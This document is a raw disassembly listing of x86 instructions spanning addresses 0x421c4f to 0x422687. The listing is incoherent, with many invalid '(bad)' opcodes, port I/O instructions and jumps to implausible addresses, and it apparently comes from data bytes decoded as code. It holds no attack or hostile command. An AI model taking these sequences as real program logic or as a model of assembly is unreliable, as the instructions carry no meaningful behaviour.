  421c4f:	pop    eax
  421c50:	add    BYTE PTR [eax],cl
  421c52:	daa    
  421c53:	pop    esi
  421c54:	add    BYTE PTR [eax],al
  421c56:	pop    ds
  421c57:	pop    eax
  421c58:	add    al,BYTE PTR [eax]
  421c5a:	pop    ss
  421c5b:	pop    eax
  421c5c:	add    BYTE PTR [eax],cl
  421c5e:	out    dx,eax
  421c5f:	pop    ebp
  421c60:	add    al,BYTE PTR [eax]
  421c62:	out    dx,eax
  421c63:	pop    ebp
  421c64:	add    BYTE PTR [eax],cl
  421c66:	fistp  WORD PTR [ebp+0x0]
  421c69:	or     bh,dl
  421c6b:	pop    ebp
  421c6c:	add    al,BYTE PTR [eax]
  421c6e:	iret   
  421c6f:	push   edi
  421c70:	add    cl,BYTE PTR [eax]
  421c72:	iret   
  421c73:	pop    ebp
  421c74:	add    al,BYTE PTR [eax]
  421c76:	xlat   BYTE PTR ds:[ebx]
  421c77:	pop    ebp
  421c78:	add    cl,BYTE PTR [eax]
  421c7a:	fist   WORD PTR [edi+0x0]
  421c7d:	add    BYTE PTR [edi-0x50f7ffa3],ah
  421c83:	pop    ebp
  421c84:	add    BYTE PTR [eax],al
  421c86:	ds add al,0x3
  421c89:	add    dh,BYTE PTR [esi]
  421c8b:	add    al,0x3
  421c8d:	add    BYTE PTR [esi],bh
  421c8f:	add    al,0x3
  421c91:	add    bh,BYTE PTR [esi]
  421c93:	add    al,0x1
  421c95:	add    dh,BYTE PTR [esi]
  421c97:	cld    
  421c98:	add    BYTE PTR [edx],al
  421c9a:	ss cld 
  421c9c:	add    al,BYTE PTR [edx]
  421c9e:	ds in  al,dx
  421ca0:	add    al,BYTE PTR [eax]
  421ca2:	inc    esi
  421ca3:	add    al,0x3
  421ca5:	add    bh,BYTE PTR [esi]
  421ca7:	add    al,0x1
  421ca9:	add    bh,BYTE PTR [esi]
  421cab:	cld    
  421cac:	add    al,BYTE PTR [eax]
	...
  421cd6:	add    BYTE PTR [eax],al
  421cd8:	inc    esi
  421cd9:	in     al,dx
  421cda:	add    BYTE PTR [eax],al
  421cdc:	ds in  al,dx
  421cde:	add    al,BYTE PTR [edx]
  421ce0:	ss add al,0x3
  421ce3:	add    BYTE PTR [esi],bh
  421ce5:	add    al,0x1
  421ce7:	add    BYTE PTR [esi+0x2],al
  421cea:	add    eax,DWORD PTR [edx]
  421cec:	inc    esi
  421ced:	add    al,BYTE PTR [ecx]
  421cef:	add    BYTE PTR [esi],dh
  421cf1:	cli    
  421cf2:	add    BYTE PTR [edx],al
  421cf4:	ds cli 
  421cf6:	add    al,BYTE PTR [eax]
  421cf8:	add    al,BYTE PTR ds:[ecx]
  421cfb:	add    bh,BYTE PTR [esi]
  421cfd:	add    al,BYTE PTR [ebx]
  421cff:	add    dh,BYTE PTR [esi]
  421d01:	add    al,BYTE PTR [ebx]
  421d03:	add    BYTE PTR [esi],dh
  421d05:	add    al,BYTE PTR [ecx]
  421d07:	add    BYTE PTR [esi],bh
  421d09:	add    al,BYTE PTR [ebx]
  421d0b:	add    BYTE PTR [esi],bh
  421d0d:	jmp    0x202:0xfa3e0200
  421d14:	add    al,BYTE PTR ss:[ebx]
  421d17:	add    BYTE PTR [esi-0x16],al
  421d1a:	add    BYTE PTR [eax],al
  421d1c:	inc    esi
  421d1d:	add    al,BYTE PTR [ebx]
  421d1f:	add    BYTE PTR [esi],bh
  421d21:	add    al,BYTE PTR [ecx]
  421d23:	add    BYTE PTR [esi],bh
  421d25:	cli    
  421d26:	add    BYTE PTR [edx],al
  421d28:	inc    esi
  421d29:	pop    ebx
  421d2a:	out    dx,eax
  421d2b:	add    eax,0x3e7633e
  421d30:	cmp    al,0x5b
  421d32:	out    0x3,eax
  421d34:	ds arpl di,bx
  421d37:	add    eax,0x3ef633c
	...
  421d64:	add    BYTE PTR [eax],al
  421d66:	ds pop ebx
  421d68:	out    dx,eax
  421d69:	add    eax,0x5e75b3c
  421d6e:	cmp    al,0x5b
  421d70:	fild   WORD PTR [ebx]
  421d72:	ds arpl di,sp
  421d75:	add    edi,DWORD PTR [ebx+eiz*2]
  421d78:	out    dx,eax
  421d79:	add    eax,0x5df633e
  421d7e:	ds pop ebx
  421d80:	out    0x3,eax
  421d82:	cmp    al,0x63
  421d84:	out    dx,eax
  421d85:	add    eax,0x3ef5b3c
  421d8a:	ds pop ebx
  421d8c:	fild   WORD PTR [ebx]
  421d8e:	cmp    al,0x63
  421d90:	out    0x5,eax
  421d92:	cmp    al,0x5b
  421d94:	call   0x689cdbbc
  421d99:	and    edi,DWORD PTR [esi]
  421d9b:	pop    ebx
  421d9c:	push   0x675b3e23
  421da1:	add    edi,DWORD PTR [esi]
  421da3:	pop    ebx
  421da4:	and    edi,DWORD PTR [bp+0x685a]
  421da9:	add    edi,DWORD PTR [esi-0x41fc17a6]
  421daf:	pop    edx
  421db0:	call   0xe79d5bd8
  421db5:	add    edi,DWORD PTR [esi]
  421db7:	pop    ebx
  421db8:	out    0x23,eax
  421dba:	mov    esi,0xbe23e75a
  421dbf:	pop    edx
  421dc0:	push   0x685abe24
  421dc5:	add    al,0x3e
  421dc7:	pop    ebx
  421dc8:	out    0x3,eax
	...
  421df2:	add    BYTE PTR [eax],al
  421df4:	ds pop ebx
  421df6:	add    BYTE PTR [ecx+0x3a],ch
  421df9:	(bad)  
  421dfb:	out    0x3d,eax
  421dfd:	(bad)  
  421dff:	out    0x3d,eax
  421e01:	pop    ebx
  421e02:	add    cl,ch
  421e04:	pop    ebp
  421e05:	pop    ebx
  421e06:	add    cl,ch
  421e08:	cmp    eax,0x5de7ffdb
  421e0d:	(bad)  
  421e0f:	push   0xe9005b3a
  421e14:	cmp    eax,0x5de7ffdb
  421e19:	pop    ebx
  421e1a:	add    BYTE PTR [ecx+0x22],ch
  421e1d:	pop    ebx
  421e1e:	add    BYTE PTR [eax+0x3a],ch
  421e21:	(bad)  
  421e23:	out    0x3d,eax
  421e25:	pop    ebx
  421e26:	add    BYTE PTR [ecx+0x1a],ch
  421e29:	pop    ebx
  421e2a:	add    BYTE PTR [ecx+0x42],ch
  421e2d:	(bad)  
  421e2f:	call   0x69427951
  421e34:	and    bl,bl
  421e36:	jmp    DWORD PTR [edi+0x1a]
  421e39:	(bad)  
  421e3b:	addr16 inc edx
  421e3d:	pop    ebx
  421e3e:	add    BYTE PTR [ecx+0x3a],ch
  421e41:	(bad)  
  421e43:	out    0x3d,eax
  421e45:	(bad)  
  421e47:	call   0x6841f9a9
  421e4c:	(bad)  
  421e4d:	(bad)  
  421e4f:	cmp    bl,BYTE PTR [bp+di+0x0]
  421e53:	jmp    0xe9427995
	...
  421e80:	add    BYTE PTR [eax],al
  421e82:	cmp    eax,0x1de9005b
  421e87:	(bad)  
  421e89:	push   0x69005b1d
  421e8e:	cmp    eax,0x3d67ffdb
  421e93:	(bad)  
  421e95:	out    0x3d,eax
  421e97:	pop    ebx
  421e98:	add    BYTE PTR [eax],al
  421e9a:	out    0x3a,al
  421e9c:	add    BYTE PTR [eax],0x56
  421e9f:	cmp    al,BYTE PTR [eax]
  421ea1:	add    BYTE PTR [esi+0x3a],dl
  421ea4:	add    BYTE PTR [eax],al
  421ea6:	daa    
  421ea7:	pop    edx
  421ea8:	add    BYTE PTR [eax],al
  421eaa:	cmp    al,BYTE PTR es:[eax+0x5a1600]
  421eb1:	add    BYTE PTR [esi-0x58ffffa6],dl
  421eb7:	cmp    al,BYTE PTR [eax]
  421eb9:	add    BYTE PTR [esi-0x69ff7fa6],ah
  421ebf:	cmp    al,BYTE PTR [eax]
  421ec1:	add    BYTE PTR [edi],dl
  421ec3:	cmp    al,BYTE PTR [eax-0x7fa61a00]
  421ec9:	add    BYTE PTR [esi+0x3a],ah
  421ecc:	add    BYTE PTR [eax],al
  421ece:	xlat   BYTE PTR ds:[ebx]
  421ecf:	cmp    DWORD PTR [eax],eax
  421ed1:	add    BYTE PTR [edi+0x5a],dl
  421ed4:	add    BYTE PTR [eax],0x66
  421ed7:	cmp    al,BYTE PTR [eax+0x59e700]
  421edd:	add    BYTE PTR [edi+0x5a],dl
  421ee0:	add    BYTE PTR [eax],0x57
  421ee3:	cmp    al,BYTE PTR [eax]
	...
  421f0d:	add    BYTE PTR [eax],al
  421f0f:	add    BYTE PTR [edi+0x2700803a],ah
  421f15:	push   edi
  421f16:	add    BYTE PTR [eax],al
  421f18:	pop    ss
  421f19:	push   edi
  421f1a:	or     BYTE PTR [edx],al
  421f1c:	pop    ss
  421f1d:	pop    edx
  421f1e:	or     BYTE PTR [edx],al
  421f20:	daa    
  421f21:	push   edi
  421f22:	add    BYTE PTR [edx+0x27],al
  421f25:	pop    edx
  421f26:	or     BYTE PTR [eax],al
  421f28:	pop    ss
  421f29:	push   edi
  421f2a:	add    BYTE PTR [eax],al
  421f2c:	pop    ss
  421f2d:	pop    edx
  421f2e:	add    BYTE PTR [eax-0x19],al
  421f31:	pop    ecx
  421f32:	or     BYTE PTR [edx],al
  421f34:	out    0x58,eax
  421f36:	or     BYTE PTR [eax-0x29],al
  421f39:	pop    ecx
  421f3a:	or     BYTE PTR [eax],al
  421f3c:	ds add al,0x2
  421f3f:	add    BYTE PTR [esp+eax*1],bh
  421f42:	add    cl,BYTE PTR [eax]
  421f44:	jle    0x421f4a
  421f46:	add    al,BYTE PTR [eax]
  421f48:	jl     0x421f4e
  421f4a:	add    DWORD PTR [eax],ecx
  421f4c:	jl     0x421f52
  421f4e:	add    cl,BYTE PTR [eax]
  421f50:	ds add al,0x1
  421f53:	add    dh,bh
  421f55:	add    eax,DWORD PTR [ecx]
  421f57:	add    BYTE PTR [esp+eax*1],bh
  421f5a:	add    DWORD PTR [eax],ecx
  421f5c:	inc    BYTE PTR [ebx]
  421f5e:	add    DWORD PTR [eax],ecx
  421f60:	inc    BYTE PTR [ebx]
  421f62:	add    DWORD PTR [eax],eax
  421f64:	ds add al,0x2
  421f67:	add    dh,bh
  421f69:	add    eax,DWORD PTR [edx]
  421f6b:	or     ah,bh
  421f6d:	add    eax,DWORD PTR [edx]
  421f6f:	or     ah,bh
  421f71:	add    eax,DWORD PTR [edx]
	...
  421f9b:	add    BYTE PTR [eax],al
  421f9d:	add    BYTE PTR [esp+eax*1],bh
  421fa0:	add    DWORD PTR [eax],ecx
  421fa2:	cld    
  421fa3:	add    eax,DWORD PTR [edx]
  421fa5:	add    dh,bh
  421fa7:	add    eax,DWORD PTR [ecx]
  421fa9:	add    BYTE PTR [esi],bh
  421fab:	add    al,0x1
  421fad:	add    ah,bh
  421faf:	add    eax,DWORD PTR [edx]
  421fb1:	or     BYTE PTR [esp+eax*1],bh
  421fb4:	add    DWORD PTR [eax],eax
  421fb6:	cmp    al,0x4
  421fb8:	add    DWORD PTR [eax],eax
  421fba:	jl     0x421fbe
  421fbc:	add    cl,BYTE PTR [eax]
  421fbe:	add    al,BYTE PTR ds:[ecx]
  421fc1:	or     BYTE PTR [esi],bh
  421fc3:	add    al,BYTE PTR [edx]
  421fc5:	add    BYTE PTR [edx+eax*1+0x2],bh
  421fc9:	add    BYTE PTR [esi],bh
  421fcb:	add    al,BYTE PTR [ecx]
  421fcd:	add    BYTE PTR [edx+eax*1],bh
  421fd0:	add    DWORD PTR [eax],eax
  421fd2:	jle    0x421fd6
  421fd4:	add    DWORD PTR [eax],ecx
  421fd6:	cmp    al,0x2
  421fd8:	add    al,BYTE PTR [eax]
  421fda:	jl     0x421fde
  421fdc:	add    cl,BYTE PTR [eax]
  421fde:	jle    0x42203b
  421fe0:	out    0x2,eax
  421fe2:	ds pop ecx
  421fe4:	out    0x3,eax
  421fe6:	ds fwait
  421fe8:	out    0x3,eax
  421fea:	inc    esi
  421feb:	cdq    
  421fec:	out    0x2,eax
  421fee:	inc    esi
  421fef:	pop    ecx
  421ff0:	out    0x2,eax
  421ff2:	ss fwait
  421ff4:	out    0x2,eax
  421ff6:	ds pop ebx
  421ff8:	out    0x3,eax
  421ffa:	ds pop ecx
  421ffc:	out    0x3,eax
  421ffe:	inc    esi
  421fff:	cdq    
  422000:	out    0x2,eax
	...
  42202a:	add    BYTE PTR [eax],al
  42202c:	ss cdq 
  42202e:	out    0x2,eax
  422030:	ss pop ebx
  422032:	out    0x3,eax
  422034:	ds cdq 
  422036:	out    0x2,eax
  422038:	inc    esi
  422039:	cdq    
  42203a:	out    0x3,eax
  42203c:	ss pop ecx
  42203e:	out    0x3,eax
  422040:	ds pop ebx
  422042:	out    0x3,eax
  422044:	inc    esi
  422045:	fwait
  422046:	out    0x3,eax
  422048:	ds cdq 
  42204a:	out    0x2,eax
  42204c:	ss pop ebx
  42204e:	out    0x2,eax
  422050:	ds pop ecx
  422052:	out    0x2,eax
  422054:	ds fwait
  422056:	out    0x3,eax
  422058:	inc    esi
  422059:	pop    ebx
  42205a:	out    0x3,eax
  42205c:	ds pop ebx
  42205e:	out    0x3,eax
  422060:	ss fwait
  422062:	out    0x2,eax
  422064:	inc    esi
  422065:	pop    ecx
  422066:	out    0x2,eax
  422068:	ds fwait
  42206a:	test   DWORD PTR [ebx],0x3e73b3e
  422070:	jle    0x4220ad
  422072:	out    0xc3,eax
  422074:	sbb    esp,ebp
  422076:	test   bl,0x51
  422079:	cmp    esp,edi
  42207b:	add    edi,DWORD PTR [esi+0x3b]
  42207e:	xlat   BYTE PTR ds:[ebx]
  42207f:	add    edi,DWORD PTR [esi]
  422081:	pop    ebx
  422082:	add    cl,bl
  422084:	std    
  422085:	sub    esp,DWORD PTR [eax]
  422087:	jmp    0xe942bbc9
  42208c:	std    
  42208d:	jmp    0x4220ab
  42208f:	stc    
	...
  4220b8:	add    BYTE PTR [eax],al
  4220ba:	std    
  4220bb:	sub    eax,DWORD PTR [eax]
  4220bd:	jmp    0xf942bbff
  4220c2:	cmp    eax,0x3dd9205b
  4220c7:	fwait
  4220c8:	add    cl,ch
  4220ca:	std    
  4220cb:	jmp    0x4220e9
  4220cd:	jmp    0xd9627c0f
  4220d2:	jge    0x4220bf
  4220d4:	cld    
  4220d5:	jmp    0xf9427c17
  4220da:	cmp    eax,0x7df9009b
  4220df:	jmp    0x4220fd
  4220e1:	jmp    0xea3f0c63
  4220e6:	jge    0x422113
  4220e8:	add    cl,bl
  4220ea:	jge    0x4220d7
  4220ec:	sbb    al,0xd9
  4220ee:	cmp    eax,0x3dd9005b
  4220f3:	fwait
  4220f4:	and    cl,bh
  4220f6:	cmp    eax,0x3de9209b
  4220fb:	pop    ebx
  4220fc:	add    cl,bh
  4220fe:	jge    0x42212b
  422100:	add    cl,ch
  422102:	jge    0x42212f
  422104:	and    cl,bl
  422106:	jge    0x4220f3
  422108:	cld    
  422109:	jmp    0xe9424c8b
  42210e:	std    
  42210f:	sub    ah,BYTE PTR [eax]
  422111:	jmp    0xe9627c53
  422116:	std    
  422117:	jmp    0xf900:0x5b3df91c
	...
  422146:	add    BYTE PTR [eax],al
  422148:	cmp    eax,0xfde9209b
  42214d:	sub    al,BYTE PTR [eax]
  42214f:	add    bh,ah
  422151:	push   ds
  422152:	cmp    eax,0x405f1720
  422157:	add    BYTE PTR [edi],dl
  422159:	pop    ds
  42215a:	std    
  42215b:	call   DWORD PTR [edi]
  42215d:	pop    edi
  42215e:	add    BYTE PTR [eax],ah
  422160:	xlat   BYTE PTR ds:[ebx]
  422161:	pop    esi
  422162:	inc    eax
  422163:	add    bh,dl
  422165:	push   ds
  422166:	std    
  422167:	pop    ds
  422168:	out    0x5e,eax
  42216a:	add    BYTE PTR [eax],ah
  42216c:	xlat   BYTE PTR ds:[ebx]
  42216d:	push   ds
  42216e:	std    
  42216f:	jmp    edi
  422171:	pop    esi
  422172:	add    BYTE PTR [eax],ah
  422174:	out    0x1e,eax
  422176:	cmp    eax,0x3d1ea720
  42217b:	add    BYTE PTR [edi-0x58dfbfa2],ah
  422181:	push   ds
  422182:	cmp    eax,0x3d1e9700
  422187:	and    BYTE PTR [edi-0x68ffffa2],ah
  42218d:	pop    esi
  42218e:	inc    eax
  42218f:	and    BYTE PTR [edi+0x5e],ah
  422192:	add    BYTE PTR [eax],al
  422194:	xchg   edi,eax
  422195:	push   ds
  422196:	std    
  422197:	jmp    DWORD PTR [edi+0x5e]
  42219a:	inc    eax
  42219b:	and    BYTE PTR [edi+0x57003d1e],dl
  4221a1:	push   ds
  4221a2:	std    
  4221a3:	jmp    DWORD PTR [edi+0x5e]
  4221a6:	inc    eax
  4221a7:	add    BYTE PTR [edi+0x1e],dl
  4221aa:	std    
  4221ab:	pop    ds
	...
  4221d4:	add    BYTE PTR [eax],al
  4221d6:	addr16 pop esi
  4221d8:	add    BYTE PTR [eax],al
  4221da:	push   edi
  4221db:	push   ds
  4221dc:	cmp    eax,0x5e5720
  4221e1:	and    BYTE PTR [edi],dl
  4221e3:	pop    esi
  4221e4:	inc    eax
  4221e5:	add    BYTE PTR [edi],dl
  4221e7:	push   ds
  4221e8:	std    
  4221e9:	pop    ds
  4221ea:	pop    ss
  4221eb:	pop    esi
  4221ec:	and    BYTE PTR [eax],al
  4221ee:	adc    eax,0x3e04205e
  4221f3:	idiv   al
  4221f5:	(bad)  
  4221f6:	cmp    eax,0x3e0000f4
  4221fb:	hlt    
  4221fc:	clc    
  4221fd:	inc    DWORD PTR [ecx]
  4221ff:	idiv   al
  422201:	(bad)  
  422202:	cmp    eax,0x3e1ff8f6
  422207:	hlt    
  422208:	clc    
  422209:	pop    ds
  42220a:	inc    edx
  42220b:	idiv   al
  42220d:	pop    ds
  42220e:	cmp    dh,ah
  422210:	add    BYTE PTR [eax],ah
  422212:	ds hlt 
  422214:	add    BYTE PTR [eax],al
  422216:	test   BYTE PTR ds:[eax],0x0
  42221a:	inc    edx
  42221b:	test   BYTE PTR [eax],0x0
  42221e:	ds hlt 
  422220:	add    BYTE PTR [eax],al
  422222:	inc    edx
  422223:	test   BYTE PTR [eax],0x20
  422226:	cmp    dh,dh
  422228:	clc    
  422229:	jmp    FWORD PTR [ecx+0x3dfff8f3]
  42222f:	idiv   al
  422231:	pop    ds
  422232:	test   BYTE PTR ds:[eax],0x20
  422236:	ds hlt 
  422238:	clc    
  422239:	inc    DWORD PTR [eax]
	...
  422263:	add    BYTE PTR ds:0x3a0000f6,bh
  422269:	hlt    
  42226a:	add    BYTE PTR [eax],ah
  42226c:	inc    edx
  42226d:	hlt    
  42226e:	clc    
  42226f:	pop    ds
  422270:	cmp    dh,dh
  422272:	add    BYTE PTR [eax],ah
  422274:	ds hlt 
  422276:	add    BYTE PTR [eax],ah
  422278:	cmp    dh,ah
  42227a:	clc    
  42227b:	call   FWORD PTR [ecx-0xb]
  42227e:	clc    
  42227f:	call   DWORD PTR [ecx-0xb]
  422282:	clc    
  422283:	pop    ds
  422284:	inc    edx
  422285:	hlt    
  422286:	clc    
  422287:	pop    ds
  422288:	test   BYTE PTR ds:[eax],0x0
  42228c:	repnz add BYTE PTR ds:[eax],al
  422290:	cmp    dh,dl
  422292:	clc    
  422293:	pop    ds
  422294:	ds pop ebx
  422296:	out    0x3,eax
  422298:	ds pop edi
  42229a:	out    0xfb,eax
  42229c:	cmp    DWORD PTR [ebx-0x19],ebx
  42229f:	add    ebx,DWORD PTR [esi+0x5b]
  4222a2:	jmp    0xe99f2ca2
  4222a7:	sti    
  4222a8:	add    DWORD PTR [ebp-0x17],ebx
  4222ab:	add    ebx,DWORD PTR [esi]
  4222ad:	pop    edi
  4222ae:	jmp    0xe9a140b6
  4222b3:	add    edi,DWORD PTR [esi]
  4222b5:	pop    ebx
  4222b6:	jmp    0xe79d40be
  4222bb:	add    edi,DWORD PTR [esi]
  4222bd:	pop    edi
  4222be:	out    0xfb,eax
  4222c0:	rcr    DWORD PTR [edi+eiz*8+0x3],1
  4222c4:	push   ds
  4222c5:	pop    ebx
  4222c6:	out    0xfb,eax
	...
  4222f0:	add    BYTE PTR [eax],al
  4222f2:	and    DWORD PTR [edi-0x17],ebx
  4222f5:	sti    
  4222f6:	mov    ecx,0x51fbe8e8
  4222fb:	pop    ebx
  4222fc:	out    0xfb,eax
  4222fe:	dec    ecx
  4222ff:	pop    edi
  422300:	jmp    0xe92ac500
  422305:	add    edi,DWORD PTR [esi]
  422307:	pop    edi
  422308:	jmp    0xe7a15508
  42230d:	add    ebx,DWORD PTR [esi+0x5f]
  422310:	out    0xfb,eax
  422312:	and    DWORD PTR [ebx-0x19],ebx
  422315:	add    edi,DWORD PTR [esi]
  422317:	pop    ebx
  422318:	jmp    0xe99d6120
  42231d:	sti    
  42231e:	dec    ecx
  42231f:	pop    edi
  422320:	out    0x3,eax
  422322:	ds pop ebx
  422324:	jmp    0xe79d5d24
  422329:	add    ebx,DWORD PTR [esi]
  42232b:	pop    edi
  42232c:	out    0xfb,eax
  42232e:	dec    ecx
  42232f:	call   0x5f80271c
  422334:	out    0xfb,eax
  422336:	cmp    DWORD PTR [eax+eax*1-0x17],ebx
  42233a:	xor    eax,0x3debfce8
  42233f:	cmp    eax,DWORD PTR [eax]
  422341:	test   eax,0xe90ce82d
  422346:	or     eax,0x3de9fce8
  42234b:	pop    edi
  42234c:	add    BYTE PTR [ecx-0x16efa3f3],ch
  422352:	cmp    eax,0xa9105b
	...
  42237f:	add    ch,ch
  422381:	out    0xc,eax
  422383:	test   eax,0xe9005b3d
  422388:	cmp    eax,0x3a29105b
  42238d:	pop    edi
  42238e:	add    cl,ch
  422390:	cmp    eax,0xca29105f
  422395:	pop    ebx
  422396:	adc    cl,ch
  422398:	int    0x5b
  42239a:	add    cl,ch
  42239c:	int    0x5b
  42239e:	adc    BYTE PTR [ecx],ch
  4223a0:	mov    dl,0x5b
  4223a2:	add    cl,ch
  4223a4:	lods   eax,DWORD PTR ds:[esi]
  4223a5:	out    0xfc,eax
  4223a7:	sub    DWORD PTR [edx+0x5b],eax
  4223aa:	add    cl,ch
  4223ac:	cmp    eax,0x4229105f
  4223b1:	pop    ebx
  4223b2:	adc    cl,ch
  4223b4:	(bad)  
  4223b5:	out    0xc,eax
  4223b7:	sub    DWORD PTR [edx-0x72160319],edx
  4223bd:	pop    ebx
  4223be:	add    BYTE PTR [ecx],ch
  4223c0:	inc    edx
  4223c1:	pop    edi
  4223c2:	add    BYTE PTR [ecx],ch
  4223c4:	cmp    bl,BYTE PTR [edi+0x10]
  4223c7:	jmp    0xa9527f39
  4223cc:	ins    DWORD PTR es:[edi],dx
  4223cd:	out    0xfc,eax
  4223cf:	jmp    0xe9427f11
  4223d4:	cmp    eax,0x3da9005b
  4223d9:	pop    edi
  4223da:	adc    BYTE PTR [eax],al
  4223dc:	xchg   edi,eax
  4223dd:	pop    ebx
  4223de:	add    BYTE PTR [eax],dl
  4223e0:	daa    
  4223e1:	jmp    0x4223df
  4223e3:	sldt   WORD PTR [eax]
	...
  42240e:	out    0xea,eax
  422410:	add    BYTE PTR [eax],al
  422412:	pop    ss
  422413:	pop    ebx
  422414:	add    al,0x0
  422416:	xlat   BYTE PTR ds:[ebx]
  422417:	jmp    0x4:0x5b270000
  42241e:	daa    
  42241f:	jmp    0x422421
  422421:	adc    BYTE PTR [edi],dl
  422423:	jmp    0x422421
  422425:	call   edi
  422427:	pop    edx
  422428:	add    BYTE PTR [eax],al
  42242a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42242b:	pop    edx
  42242c:	add    al,0x10
  42242e:	out    0xea,eax
  422430:	cld    
  422431:	call   DWORD PTR [edi-0x28ffff16]
  422437:	jmp    0x0:0x5f270ffc
  42243e:	daa    
  42243f:	pop    edi
  422440:	add    BYTE PTR [eax],dl
  422442:	xlat   BYTE PTR ds:[ebx]
  422443:	pop    edx
  422444:	add    al,0x10
  422446:	pop    ss
  422447:	pop    edi
  422448:	add    al,0x10
  42244a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42244b:	pop    edx
  42244c:	add    BYTE PTR [eax],dl
  42244e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42244f:	pop    edx
  422450:	add    al,0x0
  422452:	push   edi
  422453:	out    dx,eax
  422454:	cld    
  422455:	seta   BYTE PTR [edx+0x0]
  422459:	add    BYTE PTR [edi-0x11],ah
  42245c:	add    BYTE PTR [eax],dl
  42245e:	addr16 pop edi
  422460:	add    al,0x0
  422462:	push   edi
  422463:	pop    edi
  422464:	add    BYTE PTR [eax],dl
  422466:	xchg   edi,eax
  422467:	pop    edx
  422468:	add    al,0x10
  42246a:	addr16 jmp 0xffc:0xef270ffc
	...
  42249a:	add    BYTE PTR [eax],al
  42249c:	push   edi
  42249d:	pop    edx
  42249e:	add    BYTE PTR [eax],al
  4224a0:	xchg   edi,eax
  4224a1:	jmp    0x0:0xea671000
  4224a8:	ds hlt 
  4224aa:	lock add edi,DWORD PTR [esi]
  4224ad:	mov    ah,0xf0
  4224af:	inc    DWORD PTR [ecx-0x4c]
  4224b2:	lock (bad) 
  4224b4:	cmp    DWORD PTR [eax+eax*1+0xf43e04],esi
  4224bb:	add    BYTE PTR [esi-0xc],cl
  4224be:	lock add ecx,DWORD PTR [esi+0x34]
  4224c2:	(bad)  
  4224c3:	(bad)  
  4224c4:	sbb    esp,esi
  4224c6:	add    BYTE PTR [eax],al
  4224c8:	ds hlt 
  4224ca:	add    BYTE PTR [eax],al
  4224cc:	ds int3 
  4224ce:	jp     0x4224cf
  4224d0:	add    esp,eax
  4224d2:	cmp    edi,0xfffffff9
  4224d5:	pop    DWORD PTR [ecx+0xf3f1ff]
  4224db:	add    BYTE PTR [esi],bh
  4224dd:	hlt    
  4224de:	add    BYTE PTR [eax],al
  4224e0:	ds cli 
  4224e2:	jge    0x4224e3
  4224e4:	fstp   DWORD PTR [edi-0x7e]
  4224e7:	call   ecx
  4224e9:	ret    
  4224ea:	cmp    edi,0xffffffc9
  4224ed:	repz add BYTE PTR [eax],al
  4224f0:	ds hlt 
  4224f2:	add    BYTE PTR [eax],al
  4224f4:	ds add al,0x7c
  4224f7:	push   DWORD PTR [ecx-0x56007dcd]
  4224fd:	imul   eax,DWORD PTR [edi+edi*8+0x0],0x0
	...
  422529:	add    BYTE PTR [ecx+0x3e0000f3],ah
  42252f:	hlt    
  422530:	add    BYTE PTR [eax],al
  422532:	ds test al,0x7a
  422535:	dec    DWORD PTR [ecx-0x7e007dc5]
  42253b:	retf   
  42253c:	cmp    edi,0x79
  42253f:	repz add BYTE PTR [eax],al
  422542:	ds hlt 
  422544:	add    BYTE PTR [eax],al
  422546:	bound  edi,QWORD PTR ds:[ebx-0x1]
  42254a:	popa   
  42254b:	pop    edx
  42254c:	fild   WORD PTR [ecx-0x7ba91aa7]
  422552:	push   ecx
  422553:	in     eax,0xe6
  422555:	add    edi,DWORD PTR [esi]
  422557:	pop    ebx
  422558:	out    0x3,eax
  42255a:	ds pop ebx
  42255c:	(bad)  
  42255e:	cmp    ebp,esp
  422560:	data16 xor BYTE PTR [ecx],0xe5
  422564:	xor    al,BYTE PTR [ecx+ebp*1+0x3e03e6e5]
  42256b:	pop    ebx
  42256c:	out    0x3,eax
  42256e:	ds pop ebx
  422570:	mov    eax,ds:0x62e5117b
  422575:	or     BYTE PTR [ecx],0xe5
  422578:	out    dx,al
  422579:	add    BYTE PTR [ecx],0xe5
  42257c:	out    0x3,al
  42257e:	ds pop ebx
  422580:	out    0x3,eax
  422582:	ds pop ebx
  422584:	icebp  
  422585:	jnp    0x422570
  422587:	in     al,0x3e
  422589:	and    cl,0xe4
  42258c:	sub    al,BYTE PTR [ebx+0x0]
	...
  4225b6:	add    BYTE PTR [eax],al
  4225b8:	ftst   
  4225ba:	out    0x3,al
  4225bc:	ds pop ebx
  4225be:	out    0x3,eax
  4225c0:	ds pop ebx
  4225c2:	std    
  4225c3:	jp     0x422586
  4225c5:	in     al,0x9a
  4225c7:	cmp    DWORD PTR [ecx+0x3e03e6e4],0x3e03e75b
  4225d1:	pop    ebx
  4225d2:	out    0x3,eax
  4225d4:	ds pop ebx
  4225d6:	out    0x3,eax
  4225d8:	ds pop ebx
  4225da:	out    0x3,eax
  4225dc:	ds pop ebx
  4225de:	xchg   DWORD PTR [ecx-0x7e831b77],eax
  4225e4:	and    esp,0xe4798180
  4225ea:	out    dx,al
  4225eb:	xor    BYTE PTR [ecx-0x1c],0xff
  4225ef:	fdivr  QWORD PTR [esi-0x4136031c]
  4225f5:	in     al,0xfc
  4225f7:	pop    ss
  4225f8:	mov    edi,0xbf1ffce4
  4225fd:	in     al,0xfc
  4225ff:	mov    ds:0xb1fce4be,eax
  422604:	mov    esi,0xbecdfce4
  422609:	jecxz  0x422607
  42260b:	mov    ecx,0x6ffce3be
  422610:	mov    esi,0xbe8bfce3
  422615:	jecxz  0x422613
  422617:	pop    ecx
  422618:	mov    esi,0x27fce3
	...
  422645:	add    BYTE PTR [esi-0x41c0031d],bh
  42264b:	jecxz  0x422649
  42264d:	add    DWORD PTR [esi-0x41fe031d],edi
  422653:	jecxz  0x422651
  422655:	repz jno 0x42263c
  422658:	cld    
  422659:	shr    DWORD PTR [ecx-0x1c],cl
  42265c:	cld    
  42265d:	mov    edi,0x25fce461
  422662:	(bad)  
  422663:	jecxz  0x422661
  422665:	cmp    esi,eax
  422667:	jecxz  0x422665
  422669:	dec    edi
  42266a:	mov    dh,0xe3
  42266c:	cld    
  42266d:	push   edi
  42266e:	mov    dh,0xe3
  422670:	cld    
  422671:	imul   eax,esi,0xffffffe3
  422674:	cld    
  422675:	pop    edi
  422676:	(bad)  
  422677:	jecxz  0x422675
  422679:	jns    0x422631
  42267b:	jecxz  0x422679
  42267d:	outs   dx,DWORD PTR ds:[esi]
  42267e:	mov    dh,0xe3
  422680:	cld    
  422681:	mov    bh,0xc6
  422683:	jecxz  0x422681
  422685:	mov    esi,eax
  422687:	jecxz  0x422685
